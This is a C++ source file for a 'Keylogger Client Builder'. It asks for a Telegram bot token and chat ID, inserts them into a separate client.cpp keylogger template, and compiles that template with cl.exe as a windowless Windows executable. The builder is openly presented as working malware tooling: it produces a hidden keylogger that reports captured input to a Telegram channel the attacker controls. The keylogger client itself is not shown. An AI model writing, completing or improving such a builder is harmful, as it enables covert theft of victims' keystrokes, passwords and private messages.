// builder.cpp - Compile this first
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

int main() {
    std::string api_token, chat_id, output_file;

    std::cout << "=== Keylogger Client Builder ===\n";
    std::cout << "Enter your Telegram Bot API Token: ";
    std::getline(std::cin, api_token);
    std::cout << "Enter your Admin Chat ID: ";
    std::getline(std::cin, chat_id);
    std::cout << "Enter output EXE name (e.g., Client.exe): ";
    std::getline(std::cin, output_file);

    // Read the original client source code
    std::ifstream sourceFile("client.cpp");
    if (!sourceFile.is_open()) {
        std::cerr << "Error: Could not find client.cpp!\n";
        return 1;
    }

    std::string sourceCode((std::istreambuf_iterator<char>(sourceFile)), std::istreambuf_iterator<char>());
    sourceFile.close();

    // Replace the placeholders in the template with the user's input
    size_t pos = 0;
    std::string tokenPlaceholder = "YOUR_TELEGRAM_BOT_API_TOKEN";
    std::string chatIdPlaceholder = "YOUR_ADMIN_CHAT_ID";

    if ((pos = sourceCode.find(tokenPlaceholder)) != std::string::npos) {
        sourceCode.replace(pos, tokenPlaceholder.length(), api_token);
    }
    if ((pos = sourceCode.find(chatIdPlaceholder)) != std::string::npos) {
        sourceCode.replace(pos, chatIdPlaceholder.length(), chat_id);
    }

    // Write the modified source to a temporary file
    std::ofstream tempFile("temp_build.cpp");
    tempFile << sourceCode;
    tempFile.close();

    // Compile the modified source using the Microsoft C++ compiler (cl.exe)
    // This assumes cl.exe is in your PATH (Visual Studio Developer Command Prompt)
    std::string compileCommand = "cl /EHsc /O2 /D_WIN32_WINNT=0x0601 /Fe" + output_file + " temp_build.cpp ws2_32.lib user32.lib gdi32.lib shell32.lib wininet.lib /link /SUBSYSTEM:WINDOWS";
    std::cout << "Compiling...\n" << compileCommand << "\n";
    int result = system(compileCommand.c_str());

    // Clean up
    remove("temp_build.cpp");
    remove("temp_build.obj");

    if (result == 0) {
        std::cout << "Build successful! Output: " << output_file << std::endl;
    } else {
        std::cerr << "Build failed!\n";
    }

    return 0;
}
